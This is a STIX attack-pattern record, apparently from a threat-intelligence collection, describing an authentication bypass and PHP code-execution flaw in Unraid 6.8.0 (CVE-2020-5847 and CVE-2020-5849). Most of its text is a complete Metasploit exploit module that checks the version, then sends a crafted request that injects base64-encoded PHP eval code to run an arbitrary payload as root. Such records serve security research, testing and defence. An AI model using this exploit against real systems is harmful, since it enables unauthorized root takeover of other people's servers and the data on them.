{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--acfdcaa3-13cc-4271-99c3-7d6281cdc9fc",
    "created": "2024-08-14T17:02:13.727724Z",
    "modified": "2024-08-14T17:02:13.727728Z",
    "name": "Unraid 6.8.0 Auth Bypass PHP Code Execution",
    "description": " This module exploits two vulnerabilities affecting Unraid 6.8.0. An authentication bypass is used to gain access to the administrative interface, and an insecure use of the extract PHP function can be abused for arbitrary code execution as root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/unraid_auth_bypass_exec.rb",
            "external_id": "unraid_auth_bypass_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5847"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5849"
        },
        {
            "source_name": "reference",
            "url": "https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/"
        },
        {
            "source_name": "reference",
            "url": "https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Unraid 6.8.0 Auth Bypass PHP Code Execution',\n        'Description' => %q{\n          This module exploits two vulnerabilities affecting Unraid 6.8.0.\n          An authentication bypass is used to gain access to the administrative\n          interface, and an insecure use of the extract PHP function can be abused\n          for arbitrary code execution as root.\n        },\n        'Author' => [\n          'Nicolas CHATELAIN <n.chatelain@sysdream.com>'\n        ],\n        'References' => [\n          [ 'CVE', '2020-5847' ],\n          [ 'CVE', '2020-5849' ],\n          [ 'URL', 'https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/' ],\n          [ 'URL', 'https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/' ]\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['php'],\n        'Privileged' => true,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-02-10'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The URI of the Unraid application', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'webGui/images/green-on.png/'),\n      'method' => 'GET'\n    )\n\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe('Unexpected reply')\n    end\n\n    /\\sVersion:\\s(?<version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2})&nbsp;/ =~ res.body\n\n    if version && Rex::Version.new(version) == Rex::Version.new('6.8.0')\n      return CheckCode::Appears(\"Unraid version #{version} appears to be vulnerable\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    vprint_status('Sending exploit code')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'webGui/images/green-on.png/'),\n      'method' => 'GET',\n      'encode_params' => false,\n      'vars_get' =>\n      {\n        'path' => 'x',\n        'site[x][text]' => Rex::Text.uri_encode(\"<?php eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}')); ?>\", 'hex-normal')\n      }\n    )\n\n    if res.nil?\n      print_good('Request timed out, OK if running a non-forking/blocking payload...')\n    elsif res.code == 302\n      fail_with(Failure::NotVulnerable, 'Redirected, target is not vulnerable.')\n    else\n      print_warning(\"Unexpected response code #{res.code}, please check your payload.\")\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-10",
    "x_mitre_platforms": [
        "['php']"
    ]
}